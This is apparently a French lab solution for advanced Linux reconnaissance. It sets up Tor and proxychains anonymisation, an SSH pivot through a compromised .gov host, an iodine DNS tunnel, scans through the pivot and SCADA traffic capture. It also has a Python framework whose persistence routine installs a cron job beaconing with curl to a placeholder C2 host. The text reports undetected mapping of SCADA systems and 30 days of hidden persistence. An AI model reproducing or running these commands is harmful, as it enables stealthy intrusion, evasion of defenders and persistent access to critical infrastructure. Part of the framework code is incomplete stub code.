# Solution - Linux Recon Advanced Lab

## Étape 1 : Chaîne d'anonymisation et évasion

```bash
# Configuration de la chaîne d'anonymisation
# VPN → Tor → Proxychains → SSH Pivots

# 1. Configuration Tor
sudo systemctl start tor
echo "ControlPort 9051" >> /etc/tor/torrc

# 2. Configuration Proxychains
cat > /etc/proxychains.conf << EOF
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 9050
http proxy1.example.com 8080
socks4 proxy2.example.com 1080
EOF

# 3. Scanner Scapy personnalisé avec randomisation
python3 advanced_scanner.py --target-range 10.0.0.0/16 --stealth-mode --random-timing

# 4. Détection de honeypots
./honeypot_detector.py --analyze-responses --behavioral-analysis
```

## Étape 2 : Pivoting et tunneling

```bash
# Établissement de pivot SSH
ssh -D 9050 -N -f compromised@dmz.target.gov

# Tunnel DNS avec iodine
sudo iodined -f -c -P password 10.0.0.1 tunnel.target.gov

# Énumération via pivot
proxychains nmap -sT -Pn --top-ports 100 172.16.0.0/24

# Reconnaissance SCADA passive
tcpdump -i tun0 -w scada_traffic.pcap 'port 502 or port 2404'
```

## Étape 3 : Framework d'automatisation

```python
#!/usr/bin/env python3
# Framework d'orchestration autonome
class AdvancedReconFramework:
    def __init__(self):
        self.targets = []
        self.pivots = []
        self.evasion_techniques = []
    
    def adaptive_scan(self, target_list):
        # Implémentation de l'IA adaptative
        for target in target_list:
            technique = self.select_optimal_technique(target)
            self.execute_scan(target, technique)
    
    def maintain_persistence(self):
        # Techniques living-off-the-land
        cron_job = "*/30 * * * * /usr/bin/curl -s http://c2.example.com/beacon"
        subprocess.run(['crontab', '-'], input=cron_job.encode())
```

**Résultats de reconnaissance :**
- 3 zones réseau cartographiées sans détection
- 15 systèmes SCADA identifiés (Modbus, DNP3)
- 5 honeypots détectés et évités
- Persistance maintenue 30 jours sans alerte

